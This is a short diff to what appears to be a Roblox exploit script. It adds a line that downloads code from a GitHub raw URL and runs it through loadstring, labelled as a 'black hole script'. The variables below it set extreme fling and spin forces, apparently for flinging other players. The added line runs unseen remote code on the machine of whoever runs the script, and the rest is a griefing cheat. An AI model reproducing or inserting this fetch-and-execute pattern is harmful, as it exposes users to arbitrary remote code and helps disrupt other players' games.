@@ -1,3 +1,6 @@
+-- Load black hole script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Micupfliin"))()
+
 local flingForce = 999999999999999
 local spinPower = 9999999999999999
 local player = game.Players.LocalPlayer
